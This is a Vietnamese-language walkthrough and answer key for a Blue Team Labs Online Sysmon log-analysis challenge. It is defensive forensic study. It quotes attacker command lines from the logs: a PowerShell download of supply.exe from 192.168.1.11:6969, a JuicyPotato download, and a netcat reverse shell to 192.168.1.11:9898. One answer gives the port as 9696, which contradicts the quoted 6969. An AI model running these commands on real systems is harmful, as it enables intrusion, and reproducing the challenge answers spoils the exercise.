## Description
> You are provided with Sysmon logs from a compromised endpoint. Analyse the logs to find out the steps and techniques used by the attacker.
## Link challenge
> https://blueteamlabs.online/home/challenge/log-analysis-sysmon-fabcb83517
## Solution
> ***What is the file that gave access to the attacker?***

- Đầu tiên em xem xét qua tất cả các phần của file, thấy rằng nó có lưu các lệnh cmd.
- Theo dõi thì thấy có 1 lệnh cmd đáng ngờ.
```
      "CommandLine": "\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\IEUser\\Downloads\\updater.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} "

    "C:\Windows\SysWOW64\mshta.exe": Đây là đường dẫn đến chương trình Microsoft HTML Application Host (mshta.exe). Nó được sử dụng để chạy các tệp HTA, về cơ bản là các ứng dụng HTML có thể truy cập các tài nguyên hệ thống.
    "C:\Users\IEUser\Downloads\updater.hta": Đây là đường dẫn đến tệp HTA cụ thể được thực thi, có tên là "updater.hta" và nằm trong thư mục Downloads của người dùng IEUser. Cái tên "updater" gợi ý rằng tệp này có thể liên quan đến việc cập nhật một chương trình nào đó.
    {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}: Đây là hai chuỗi giống hệt nhau, có thể là GUID (Globally Unique Identifiers) hoặc một dạng mã định danh khác. Mục đích chính xác của chúng trong lệnh này không rõ ràng, nhưng chúng có thể được sử dụng để truyền thông tin đến ứng dụng HTA hoặc liên kết nó với một quy trình cụ thể.
```

> A : updater.hta

> ***What is the powershell cmdlet used to download the malware file and what is the port?***

- Tiếp tục tìm với command em bắt gặp 1 lệnh như thế này 
``` "CommandLine": "powershell  -c INvoke-WebRequest -Uri http://192.168.1.11:6969/supply.exe -OutFile C:\\Windows\\Temp\\supply.exe"```
- Bắt đầu lệnh powershell tạo 1 kết nối tới web thông qua `-c INvoke-WebRequest` và tải xuống tệp `http://192.168.1.11:6969/supply.exe` và lưu tại `C:\\Windows\\Temp\\supply.exe`
> A : INvoke-WebRequest, 9696

> ***What is the name of the environment variable set by the attacker?***
- Tiếp tục với dòng command bên dưới `"CommandLine": "cmd  \\c set comspec=C:\\windows\\temp\\supply.exe"`
- `set comspec` : tạo 1 biến môi trường cho `C:\\windows\\temp\\supply.exe`
> A : comspec=C:\\windows\\temp\\supply.exe

> ***What is the process used as a LOLBIN to execute malicious commands?***

- Đầu tiên, lolbin là gì ?
```
LOLBin là một kỹ thuật mà tin tặc sử dụng để thực hiện các cuộc tấn công vào hệ thống bằng cách sử dụng các chương trình (tệp thực thi hoặc tệp nhị phân) đã được cài đặt trên hệ thống đó. Các chương trình này không độc hại nên được quản trị viên hệ thống hoặc người dùng nâng cao tin cậy.

Tin tặc thực hiện các hành động độc hại mà không gây nghi ngờ bằng cách lợi dụng các chương trình đáng tin cậy này. Điều này cho phép chúng vượt qua các biện pháp bảo mật được thiết kế để phát hiện và ngăn chặn phần mềm độc hại — vì tin tặc không cần đưa phần mềm hoặc công cụ bổ sung vào hệ thống của nạn nhân.
```
- Trong quá trình đặt biến môi trường có 1 process thực thi cùng đó là ftp.exe
```
  "Image": "C:\\Windows\\SysWOW64\\ftp.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "747F3D96-DE82-6094-7713-0F0000000000",
      "LogonId": "0xf1377",
      "OriginalFileName": "ftp.exe",
      "ParentCommandLine": "cmd  \\c set comspec=C:\\windows\\temp\\supply.exe",
      "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
      "ParentProcessGuid": "747F3D96-3099-6095-D204-000000001D00",
      "ParentProcessId": 6844,
      "ProcessGuid": "747F3D96-310F-6095-DB04-000000001D00",
      "ProcessId": 6120,
      "Product": "Microsoft
```
> A : ftp.exe

> ***Malware then downloads a new file, find out the full url of the file download***
- Tại câu hỏi đầu tiên hacker thực thi lệnh và tải về file tại `"CommandLine": "C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n",`
> A : https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
> ***What is the port the attacker attempts to get reverse shell?***
- Sau khi tải xuống hacker tạo reverse shell  bằng netcat tại 192.168.1.11 và port 9898 `"CommandLine": "C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n",`

> ***Malware executed multiple same commands at a time, what is the first command executed?***
> ***Looking at the dependency events around the malware, can you able to figure out the language, the malware is written***
=> Chưa hoàn thành





